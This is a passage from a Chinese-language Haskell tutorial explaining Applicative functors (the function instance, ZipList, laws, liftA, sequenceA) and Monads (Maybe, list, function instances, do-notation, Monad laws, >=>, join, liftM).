b\uff0c\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528\u51fd\u6570 g \u5f97\u5230 a\uff0c\u7136\u540e\u5728\u5bf9 r \u548c a \u5e94\u7528 f \u5f97\u5230 b\uff0c\u6240\u4ee5\u63a8\u6d4b <*> \u51fd\u6570\u7684\u64cd\u4f5c\u5c31\u662f\uff1a \\x -> f x (g x) \u4e8e\u662f\uff1a instance Applicative (( -> ) r ) where pure x = ( \\ _ -> x ) f <*> g = \\ x -> f x ( g x ) \u5c06\u4e00\u4e2a\u503c\u653e\u5728\u51fd\u6570\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u5e94\u8be5\u8fd4\u56de\u8fd9\u4e2a\u503c\u672c\u8eab\uff0c\u6240\u4ee5 pure \u51fd\u6570\u5b9a\u4e49\u4e3a (_ -> x)\uff0c\u5373\u65e0\u8bba\u8f93\u5165\u4ec0\u4e48\uff0c\u90fd\u8fd4\u56de x \u5e94\u7528\u51fd\u5b50\u7684 <*> \u51fd\u6570\u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u5b50\u3002\u5bf9\u4e8e (->) r\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u3002\u5177\u4f53\u4f8b\u5b50\uff1a ghci > ( + ) <$> ( + 3 ) <*> ( * 100 ) $ 5 508 \u6267\u884c\u8fd9\u53e5\u65f6\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f\uff1a ( + ) <$> ( + 3 ) <*> ( * 100 ) $ 5 = (( + ) <$> ( + 3 )) <*> ( * 100 ) $ 5 = (( + ) . ( + 3 )) <*> ( * 100 ) $ 5 = ( \\ a -> ( + ) (( + 3 ) a )) <*> ( * 100 ) $ 5 = ( \\ a b -> ( a + 3 + b )) <*> ( * 100 ) $ 5 = ( \\ x -> x + 3 + (( * 100 ) x )) $ 5 = ( \\ x -> x + 3 + x * 100 ) $ 5 = 5 + 3 + 5 * 100 = 508 = ( 5 + 3 ) + ( 5 * 100 ) \u6240\u4ee5\u5c31\u76f8\u5f53\u4e8e\u5148\u5bf9\u8f93\u5165\u5206\u522b\u6267\u884c (+3) \u548c (*100)\uff0c\u7136\u540e\u5c06\u4e24\u4e2a\u7ed3\u679c\u6267\u884c\u4e86 (+) \u540c\u6837\uff1a ghci > ( \\ x y z -> [ x , y , z ]) <$> ( + 3 ) <*> ( * 2 ) <*> ( / 2 ) $ 5 [ 8.0 , 10.0 , 2.5 ] \u5148\u5bf9 5 \u5206\u522b\u6267\u884c (+3)\u3001(*2)\u3001(/2)\uff0c\u7136\u540e\u5c06\u5f97\u5230\u7684\u4e09\u4e2a\u7ed3\u679c\u4f20\u5165 (\\x y z -> [x,y,z]) \u5f97\u5230\u4e86\u6700\u7ec8\u7684\u7ed3\u679c f <$> g <*> h <*> i = ( \\ x -> f ( g x ) ( h x ) ( i x )) ZipList \u00b6 \u666e\u901a\u5217\u8868\u5b9e\u73b0\u7684 <*> \u51fd\u6570\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u6240\u6709\u503c\u4e0a\uff0c\u4f46\u8fd8\u6709\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u5bf9\u5e94\u503c\u4e0a\uff0c\u56e0\u4e3a\u540c\u4e00\u4e2a\u7c7b\u578b\u4e0d\u80fd\u5b58\u5728\u540c\u4e00\u51fd\u6570\u7684\u4e24\u79cd\u5b9e\u73b0\u5f62\u5f0f\uff0c\u6240\u4ee5\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u5217\u8868 ZipList\uff0c\u5305\u542b\u5728 Control.Applicative \u6a21\u5757\u4e2d instance Applicative ZipList where pure x = ZipList ( repeat x ) ZipList fs <*> ZipList xs = ZipList ( zipWith ( $ ) fs xs ) \u4f46\u662f ZipList \u5e76\u4e0d\u662f Show \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u8981\u4f7f\u7528 getZipList \u6765\u83b7\u53d6\u5b83\u5185\u90e8\u7684\u5217\u8868\uff1a ghci > getZipList $ ( + ) <$> ZipList [ 1 , 2 , 3 ] <*> ZipList [ 100 , 100 .. ] [ 101 , 102 , 103 ] ghci > getZipList $ (,,) <$> ZipList \"dog\" <*> ZipList \"cat\" <*> ZipList \"rat\" [( 'd' , 'c' , 'r' ),( 'o' , 'a' , 'a' ),( 'g' , 't' , 't' )] Applicative Functor Laws \u00b6 \u5e94\u7528\u51fd\u5b50\u4e00\u822c\u6709\u56db\u4e2a\u5b9a\u5f8b\uff0c\u90fd\u662f\u4fdd\u8bc1 pure \u7684\u6b63\u786e\u6027\u7684\uff1a Identity law \uff1apure id <*> v = v Homomorphism \uff1apure f <*> pure x = pure (f x) Interchange \uff1au < > pure v = pure ($ v) < > u Composition \uff1au < > (v < > w) = pure (.) < > u < > v <*> w Intuition \u00b6 \u7406\u89e3\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u5f0f\u4e5f\u662f\u5c06\u5176\u770b\u4f5c\u662f\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff0c\u6bd4\u5982\u8981\u8ba1\u7b97\uff1a \\[ [[\\ \\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ \\ ]] \\] \u5176\u4e2d \\(x_i\\) \u7684\u7c7b\u578b\u662f \\(f\\ t_i\\) \uff0c \\(f\\) \u662f\u5e94\u7528\u51fd\u5b50\uff08\u770b\u4f5c\u4e0a\u4e0b\u6587\uff09\u3002\u800c\u51fd\u6570 \\(g\\) \u7684\u7c7b\u578b\u662f\uff1a \\[ t_1\\to t_2\\to\\cdots\\to t_n\\to t \\] \u6240\u4ee5\u53cc\u62ec\u53f7\uff08idiom brackets\uff09\u7684\u4f5c\u7528\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\u3002 \\(g\\ x_1\\) \u53ef\u4ee5\u901a\u8fc7 fmap \u6765\u6267\u884c\uff0c\u5c06 \\(g\\) \u63d0\u5347\uff08lift\uff09\u5230 \\(x_1\\) \u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u5e94\u7528\u5728 \\(x_1\\) \u4e0a\u3002\u4f46\u662f fmap \u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c \\(g\\ x_1\\) \u7ed3\u679c\u7684\u7c7b\u578b\u662f\uff1a \\[ f\\ \\ (t_2\\to t_3\\to\\cdots\\to t_n\\to t) \\] \u4f46\u662f fmap \u5e76\u4e0d\u80fd\u5c06\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\uff0c\u4e8e\u662f\u5e94\u7528\u51fd\u5b50\u7684 <*> \u51fd\u6570\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u6240\u4ee5\u8ba1\u7b97 \\([[\\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ ]]\\) \uff0c\u53ea\u9700\u8981\uff1a g < $> x1 < *> x2 < *> ... < *> xn \u800c pure \u51fd\u6570\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u4e00\u4e2a\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\uff08\u51fd\u6570\u6216\u53c2\u6570\uff09\u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4f46\u4e0d\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002\u6bd4\u5982\u53c2\u6570 \\(x_2\\) \u5982\u679c\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u9700\u8981\u7528 pure \u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\u624d\u80fd\u6309\u4e0a\u9762\u8ba1\u7b97\uff1a g < $> x1 < *> pure x2 < *> ... < *> xn \u5e38\u7528\u51fd\u6570 \u00b6 liftA & liftA2 & liftA3 \u00b6 liftA :: Applicative f => (a -> b) -> f a -> f b liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c liftA3 :: Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d \u4e0d\u96be\u63a8\u6d4b liftA \u5c31\u662f fmap\uff0c liftA2 f x1 x2 \u76f8\u5f53\u4e8e f <$> x1 <*> x2 \uff0c liftA3 f x1 x2 x3 \u76f8\u5f53\u4e8e f <$> x1 <*> x2 <*> x3 <* & *> \u00b6 \u7c7b\u578b\u7c7b\u4f3c\u51fd\u5b50\u7684 <$ \u548c $> \uff1a (<*) :: Applicative f => f a -> f b -> f a (*>) :: Applicative f => f a -> f b -> f b <* \u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u5982\u679c\u4e24\u4e2a\u51fd\u5b50\u4e2d\u53c8\u4e00\u4e2a\u4e3a\u7a7a\uff0c\u5c31\u8fd4\u56de\u7a7a\uff0c\u5426\u5219\u8fd4\u56de\u7684\u7c7b\u578b\u4e0e\u7b2c\u4e00\u4e2a\u51fd\u5b50\u76f8\u540c\u3002*> \u53cd\u8fc7\u6765 ghci > Just 3 <* Just 4 Just 3 ghci > Just 3 *> Just 4 Just 4 ghci > Nothing <* Just 3 Nothing ghci > Nothing *> Just 3 Nothing ghci > [ 1 , 2 , 3 ] <* [ 3 , 4 ] [ 1 , 1 , 2 , 2 , 3 , 3 ] ghci > [ 1 , 2 , 3 ] *> [ 3 , 4 ] [ 3 , 4 , 3 , 4 , 3 , 4 ] ghci > [] <* [ 1 , 2 , 3 ] [] ghci > [] *> [ 1 , 2 , 3 ] [] <**> \u00b6 ( < **>) :: Applicative f => f a -> f (a -> b) -> f b \u63a5\u6536\u7684\u53c2\u6570\u662f <*> \u53cd\u8f6c\u8fc7\u6765\u7684\uff0c\u5373\u5148\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u51fd\u5b50\uff0c\u7136\u540e\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u51fd\u5b50\uff0c\u5728\u5c06\u5176\u5e94\u7528\u8fd4\u56de\u3002\u4f46\u662f\u548c flip(<*>) \u4e0d\u540c\uff0c\u5b83\u5148\u53d6\u53c2\u6570\u51fd\u5b50\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u7136\u540e\u518d\u53d6\u51fd\u6570\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u9010\u4e2a\u5e94\u7528\uff1a ghci > [( + 1 ), ( + 2 ), ( + 3 )] <*> [ 1 , 2 ] [ 2 , 3 , 3 , 4 , 4 , 5 ] ghci > [ 1 , 2 ] <**> [( + 1 ), ( + 2 ), ( + 3 )] [ 2 , 3 , 4 , 3 , 4 , 5 ] ghci > flip ( <*> ) [ 1 , 2 ] [( + 1 ), ( + 2 ), ( + 3 )] [ 2 , 3 , 3 , 4 , 4 , 5 ] when & unless \u00b6 when :: Applicative f => Bool -> f () -> f () \u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u662f\u4e00\u4e2a\u7ed3\u679c\u4e3a Bool \u7c7b\u578b\u7684\u6d4b\u8bd5\uff0c\u5982\u679c\u6d4b\u8bd5\u4e3a True\uff0c\u5219\u8c03\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5426\u5219\u8fd4\u56de pure ()\u3002\uff08when \u51fd\u6570\u5728\u4e0a\u6587 IO \u64cd\u4f5c\u4e2d\u4f7f\u7528\u8fc7\uff09 unless \u5219\u4e0e when \u76f8\u53cd\uff0c\u6d4b\u8bd5\u4e3a True \u8fd4\u56de pure () sequenceA \u00b6 sequenceA :: (Traversable t, Applicative f) => t (f a) -> f (t a) \u5e94\u7528\u5728\u5217\u8868\u4e0a\u65f6\uff0c\u5b83\u7684\u7c7b\u578b\u76f8\u5f53\u4e8e\uff1a [f a] -> f [a] \u6240\u4ee5\u5728\u5217\u8868\u4e0a\u5b83\u7684\u4f7f\u7528\u65b9\u6cd5\uff1a ghci > sequenceA [ Just 3 , Just 2 , Just 1 ] Just [ 3 , 2 , 1 ] ghci > sequenceA [ Just 3 , Nothing , Just 1 ] Nothing ghci > sequenceA [( + 3 ),( + 2 ),( + 1 )] 3 [ 6 , 5 , 4 ] ghci > sequenceA [[ 1 , 2 , 3 ],[ 4 , 5 , 6 ]] [[ 1 , 4 ],[ 1 , 5 ],[ 1 , 6 ],[ 2 , 4 ],[ 2 , 5 ],[ 2 , 6 ],[ 3 , 4 ],[ 3 , 5 ],[ 3 , 6 ]] ghci > sequenceA [[ 1 , 2 , 3 ],[ 4 , 5 , 6 ],[ 3 , 4 , 4 ], [] ] [] \u5b83\u5728\u5bf9\u540c\u4e00\u4e2a\u53c2\u6570\u5e94\u7528\u4e0d\u540c\u51fd\u6570\u65f6\u5f88\u6709\u7528\uff1a ghci > map ( \\ f -> f 7 ) [( > 4 ), ( < 10 ), odd ] [ True , True , True ] ghci > sequenceA [( > 4 ), ( < 10 ), odd ] 7 [ True , True , True ] Monad \u00b6 \u5355\u5b50\uff08Monad\uff09\u662f\u5bf9 Applicative Functor \u7684\u6269\u5c55\uff08\u4f46\u662f\u8bde\u751f\u6bd4 Applicative \u65e9\uff09\uff0cFunctor \u7684 <$> \u51fd\u6570\u5b9e\u73b0\u4e86\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff0cApplicative \u7684 <*> \u51fd\u6570\u5c06\u4e0a\u4e0b\u6587\u4e2d\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\u3002\u800c Monad \u63d0\u4f9b\u4e86\u4e00\u4e2a\u51fd\u6570 >>= \uff08bind\uff09\uff0c\u5c06\u4e00\u4e2a\u63a5\u6536\u666e\u901a\u503c\u8fd4\u56de\u4e0a\u4e0b\u6587\u503c\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff1a class Applicative m => Monad m where ( >>= ) :: m a -> ( a -> m b ) -> m b ( >> ) :: m a -> m b -> m b return :: a -> m a m >> n = m >>= \\ _ -> n return = pure return \u51fd\u6570\uff1a\u548c pure \u4e00\u6837\uff0c\u53ea\u662f\u6709\u53e6\u4e00\u4e2a\u540d\u5b57 >> \u51fd\u6570\uff1a\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u5b83\u7684\u4f5c\u7528\u548c Applicative \u7684 *> \u51fd\u6570\u4e00\u6837 >>= \u51fd\u6570\uff08bind\uff09\uff1a\u6bd4 Applicative \u5347\u7ea7\u7684\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u63a5\u6536\u503c\u8fd4\u56de\u5355\u5b50\u7684\u51fd\u6570\uff0c\u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e00\u4e2a\u53c2\u6570\u5355\u5b50\u4e2d\u7684\u503c\u4e0a\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u65b0\u5355\u5b50 Monad \u5b9e\u4f8b \u00b6 Maybe \u00b6 Maybe \u662f\u4e00\u4e2a\u5355\u5b50\u5b9e\u4f8b\uff0cApplicative \u5df2\u7ecf\u4e3a\u5b83\u5b9e\u73b0\u4e86 return\uff0c\u56e0\u6b64\u53ea\u9700\u8981 >>= \u51fd\u6570\uff1a instance Monad Maybe where ( Just x ) >>= f = f x Nothing >>= _ = Nothing \u6839\u636e\u5b9a\u4e49\u5c31\u5f88\u5bb9\u6613\u5b9e\u73b0 Maybe \u7684 >>= \u51fd\u6570\u4e86\uff0c\u800c\u4e14\u4e5f\u5f88\u597d\u7406\u89e3 ghci > Just 1 >>= \\ x -> Just ( x + 1 ) Just 2 ghci > Just 1 >>= \\ x -> return ( x + 1 ) Just 2 ghci > Nothing >>= \\ x -> Just ( x + 1 ) Nothing ghci > Just 1 >>= \\ x -> Just ( x + 1 ) >> Nothing >>= \\ y -> Just ( y + 1 ) Nothing \u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\u4e2d\u51fa\u73b0\u4e86 >> Nothing\uff0c\u8fd9\u65f6 Nothing \u524d\u7684\u90e8\u5206\u5168\u90fd\u76f8\u5f53\u4e8e\u6ca1\u7528\uff0c\u56e0\u4e3a >> \u64cd\u4f5c\u7b26\u7684\u5de6\u53f3\u4e24\u8fb9\u53ea\u8981\u6709\u4e00\u4e2a\u51fa\u73b0 Nothing\uff0c\u90a3\u6574\u4f53\u5c31\u4f1a\u662f Nothing\u3002\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u7528\u4e8e\u5728\u4e2d\u9014\u968f\u65f6\u5224\u65ad\u5931\u8bef\uff0c\u53ea\u8981\u6709\u4e00\u5904\u5931\u8bef\uff0c\u7ed3\u679c\u5c31\u4f1a\u662f Nothing [] \u00b6 \u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff1a instance Monad [] where xs >>= f = concat ( map f xs ) \u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728 xs \u7684\u6bcf\u4e2a\u503c\u4e0a\uff0c\u5c06\u8fd4\u56de\u7684\u6240\u6709\u5217\u8868\u5e73\u94fa\u6210\u4e00\u4e2a\u5217\u8868\uff1a ghci > [ 3 , 4 , 5 ] >>= \\ x -> [ x , - x ] [ 3 , - 3 , 4 , - 4 , 5 , - 5 ] ghci > [ 1 , 2 ] >>= \\ n -> [ 'a' , 'b' ] >>= \\ ch -> return ( n , ch ) [( 1 , 'a' ),( 1 , 'b' ),( 2 , 'a' ),( 2 , 'b' )] IO \u00b6 IO \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u4f46\u662f\u5b9e\u73b0\u65b9\u6cd5\u6bd4\u8f83\u6df1\u5965\uff08\u9003 (->) r \u00b6 (->) r \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u548c Functor\u3001Applicative \u4e00\u6837\uff0c\u5148\u5206\u6790\u5b83\u7684 >>= \u7c7b\u578b\u7b7e\u540d\uff1a (>>=) :: (-> r) a -> (a -> (-> r) b) -> (-> r) b (>>=) :: (r -> a) -> (a -> r -> b) -> (r -> b) \u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -> a\u3001g :: a -> r -> b\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: r -> b \u90a3\u4e48\u51fd\u6570 h \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b\u4e3a r \u7684\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a b \u7684\u503c\u3002\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528 f \u5f97\u5230\u7c7b\u578b\u4e3a a \u7684\u4e2d\u95f4\u503c\uff0c\u7136\u540e\u518d\u5c06\u8fd9\u4e2a\u503c\u548c\u8f93\u5165\u53c2\u6570\u4e00\u8d77\u4f20\u5165\u51fd\u6570 g \u5f97\u5230\u7ed3\u679c\u3002\u6240\u4ee5\u51fd\u6570 h \u7684\u5b9a\u4e49\u5e94\u8be5\u662f\uff1a \\x -> g (f x) x instance Monad (( -> ) r ) where f >>= g = \\ x -> g ( f x ) x ghci > ( + 3 ) >>= ( + ) $ 1 5 ghci > ( + ) <$> ( + 3 ) <*> id $ 1 5 do-notation \u00b6 Haskell \u7684 do \u8bed\u53e5\u4e3a\u94fe\u5f0f\u7684 >>= \u5e94\u7528\u63d0\u4f9b\u4e86\u7c7b\u4f3c\u547d\u4ee4\u5f0f\uff08imperative style\uff09\u7684\u8bed\u6cd5\u7cd6\u3002\u6bd4\u5982 a >>= \\x -> b >> c >>= \\y -> d \uff1a a >>= \\ x -> b >> c >>= \\ y -> d \u5176\u4e2d\u6709 abcd \u56db\u4e2a\u503c\uff0c\u53ef\u4ee5\u770b\u51fa a \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 x \u4e0a\uff0cc \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 y \u4e0a\u3002\u4f7f\u7528 do \u8bed\u53e5\u6765\u8868\u793a\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u5199\u6210\uff1a do { x <- a ; b ; y <- c ; d } \u5176\u4e2d\u7684\u5927\u62ec\u53f7\u548c\u5206\u53f7\u53ef\u4ee5\u7701\u7565\u4e0d\u5199\uff08\u6324\u5728\u4e00\u884c\u65f6\u4e0d\u80fd\u7701\u7565\uff09\u3002do \u8bed\u53e5\u4e5f\u53ea\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u5b83\u53ef\u4ee5\u9012\u5f52\u5730\u8f6c\u6362\u6210\u666e\u901a\u7684 Monad \u64cd\u4f5c\u8bed\u53e5\uff1a do e \uff1ae do { e; ... } \uff1ae >> do { ... } do { v <- e; ... } \uff1ae >>= \\v -> do { ... } do { let ...; ... } \uff1alet ... in do { ... } ApplicativeDo \u00b6 \u6bd4\u5982\u5982\u4e0b\u4e00\u4e2a do \u8bed\u53e5\uff1a do x <- a y <- b z <- c return ( f x y z ) \u5b83\u53ef\u4ee5\u8f6c\u5316\u6210\uff1a a >>= \\x -> b >>= \\y -> c >>= \\z -> return (f x y z) \u4f46\u662f\u7ecf\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u6574\u4e2a\u8bed\u53e5\u5b9e\u9645\u4e0a\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u4e86\u4e09\u4e2a\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u4e0a\uff0c\u6240\u4ee5\u4ec5\u7528 Applicative \u7684 <$> \u548c <*> \u5b8c\u5168\u53ef\u4ee5\u5b9e\u73b0\uff1a f < $> a < *> b < *> c \u800c\u4e14\u5728\u8fd0\u884c\u7684\u65f6\u5019 Applicative \u7684\u6548\u7387\u4f1a\u6bd4 Monad \u9ad8\uff0c\u6240\u4ee5 Haskell \u4f1a\u5c06 do \u8bed\u53e5\u5c3d\u53ef\u80fd\u4f18\u5148\u8f6c\u6362\u4e3a Applicative \u7684\u8868\u793a\u65b9\u6cd5\u7136\u540e\u518d\u8ba1\u7b97 Monad Laws \u00b6 Left identity \uff1areturn a >>= k = k a Right identity \uff1am >>= return = m Associativity \uff1a(m >>= g) >>= h = m >>= (\\x -> g x >>= h) \u524d\u4e24\u4e2a\u5b9a\u5f8b\u5f88\u597d\u7406\u89e3\uff1a \u5c06 a \u6ce8\u5165\u4e0a\u4e0b\u6587\u4e4b\u540e\u7ed1\u5b9a\uff08bind\uff09\u7ed9\u51fd\u6570 k(:: a -> m a)\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5c06 a \u76f4\u63a5\u4f20\u5165\u51fd\u6570 k \u5c06\u5df2\u7ecf\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u7ed1\u5b9a\u7ed9 return \u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u4fdd\u6301\u4e0d\u53d8 \u7b2c\u4e09\u4e2a\u5b9a\u5f8b\u662f\u7ed3\u5408\u5f8b\uff0c\u628a\u5b83\u5199\u6210\u66f4\u50cf\u7ed3\u5408\u5f8b\u7684\u8868\u793a\u65b9\u6cd5\u662f\uff1a (m >>= (\\x -> g x)) >>= h = m >>= (\\x -> g x >>= h) \u7ec4\u5408\u8fd0\u7b97\u7b26\uff08>=>\uff09\u5f62\u5f0f \u00b6 Control.Monad \u6a21\u5757\u4e2d\u8fd8\u5b9a\u4e49\u4e86\u51fd\u6570 >=> \uff08Kleisli-composition operator\uff09\uff1a infixr 1 >=> ( >=> ) :: Monad m => ( a -> m b ) -> ( b -> m c ) -> ( a -> m c ) f >=> g = \\ x -> f x >>= g \u4f7f\u7528 >=> \u8fd0\u7b97\u7b26\u53ef\u4ee5\u5c06\u4e24\u4e2a\u7528\u4e8e\u7ed1\u5b9a\u7684\u51fd\u6570\u7ed3\u5408\u5728\u4e00\u8d77\u3002\u7528\u5b83\u8868\u793a\u7684 Monad \u5b9a\u5f8b\u66f4\u52a0\u6e05\u6670\u76f4\u89c2\uff1a Left identity \uff1areturn >=> f = f Right identity \uff1af >=> return = f Associativity \uff1a(f >=> g) >=> h = f >=> (g >=> h) do-notation \u5f62\u5f0f \u00b6 Monad \u7684\u8fd9\u4e09\u4e2a\u5b9a\u5f8b\u8fd8\u53ef\u4ee5\u4f7f\u7528 do \u8bed\u53e5\u6765\u63cf\u8ff0\uff1a Left identity \uff1a do { x' <- return x ; f x' = do { f x } } Right identity \uff1a do { x <- m ; return x = do { m } } Associativity \uff1a do { y <- do { x <- m ; do { x <- m ; do { x <- m ; f x do { y <- f x ; y <- f x ; } = g y = g y g y } } } } Intuition \u00b6 Monad \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u770b\u6210 Applicative \u7684\u5347\u7ea7\u7248\uff0c\u6bd4\u5982 Applicative \u7684\u64cd\u4f5c\u5168\u90e8\u662f\u56fa\u5b9a\u7684\uff0c\u800c Monad \u7684\u64cd\u4f5c\u53ef\u4ee5\u5728\u4e2d\u9014\u7a81\u7136\u6539\u53d8 \u540c\u65f6 Monad \u4e5f\u5b8c\u6210\u4e86 Functor \u548c Applicative \u65e0\u6cd5\u5b8c\u6210\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\u8981\u7528 fmap \u548c\u5b9e\u73b0 >>= \u51fd\u6570\uff08\u5373\u8fbe\u6210\u64cd\u4f5c m a -> (a -> m b) -> m b\uff09\uff0c\u5148\u5047\u8bbe f :: a -> m b\uff0c\u90a3\u4e48 fmap f \u7684\u7c7b\u578b\u5c31\u4f1a\u662f m a -> m (m b)\uff0c\u5c06 m a \u5e94\u7528\u5728 fmap f \u4e0a\u4f1a\u5f97\u5230\u7ed3\u679c m (m b)\uff0c\u800c\u4e0d\u662f m b\u3002\u4f46\u662f\u76ee\u524d\u53ea\u53ef\u4ee5\u4f7f\u7528 pure \u5c06\u4e00\u4e2a\u503c\u88c5\u5165\u4e0a\u4e0b\u6587\u4e2d\uff08a -> m a\uff09\uff0c\u800c\u6ca1\u6709\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u4ece\u4e0a\u4e0b\u6587\u4e2d\u63d0\u53d6\u503c\uff08m a -> a\uff09\u3002\u90a3\u4e48\u5c31\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u64cd\u4f5c\u7684\u6548\u679c\uff08m (m b) -> m b\uff09\u3002\u56e0\u6b64 Monad \u7684\u53e6\u4e00\u4e2a\u7b49\u6548\u7684\u5b9a\u4e49\u65b9\u6cd5\u662f\uff1a class Applicative m => Monad' m where join :: m ( m a ) -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u4f46\u662f\u5b9a\u4e49 >>= \u51fd\u6570\u4f1a\u66f4\u4e3a\u76f4\u89c2\u65b9\u4fbf\uff0c\u6240\u4ee5 Haskell \u91c7\u7528\u4e86\u7528 >>= \u51fd\u6570\u5b9a\u4e49 Monad \u7684\u65b9\u6cd5 \u540c\u65f6 Haskell \u8fd8\u63d0\u4f9b\u4e86 join \u51fd\u6570\u7684\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id \u5e38\u7528\u51fd\u6570 \u00b6 liftM & ap \u00b6 liftM :: Monad m => (a -> b) -> m a -> m b ap :: Monad m => m (a -> b) -> m a -> m b \u6240\u4ee5 liftM \u5176\u5b9e\u5c31\u662f fmap\u3001ap \u5c31\u662f <*>\uff0c\u4f46\u662f\u8001\u7248\u672c\u7684 GHC \u5b9a\u4e49 Monad \u5e76\u6ca1\u6709 Functor\u3001Applicative \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u5b9e\u73b0\u4e86 liftM\u3001ap\uff0c\u5e76\u4e14\u4fdd\u7559\u4e86\u8fd9\u4e2a\u540d\u5b57 \u56e0\u6b64\u4e00\u4e2a\u5355\u5b50\u4e5f\u53ef\u4ee5\u901a\u8fc7 pure = return \u3001 (<*>) = ap \u76f4\u63a5\u6210\u4e3a\u5e94\u7528\u51fd\u5b50\u7684\u5b9e\u4f8b sequence \u00b6 sequence :: Monad m => [m a] -> m [a] sequence \u7684\u4f5c\u7528\u663e\u800c\u6613\u89c1\uff0c\u800c\u4e14\u5728 IO \u90e8\u5206\u4e5f\u4f7f\u7528\u5230\u4e86\u3002\u4f46\u662f\u8fd9\u4e2a\u7248\u672c\u662f\u5728 GHC.Base \u6a21\u5757\u4e2d\u5b9a\u4e49\u7684\uff0c\u8fd8\u6709\u4e00\u4e2a\u66f4\u5e7f\u6cdb\u7684\u4f7f\u7528 Traversable \u7684\u5b9a\u4e49\u5728 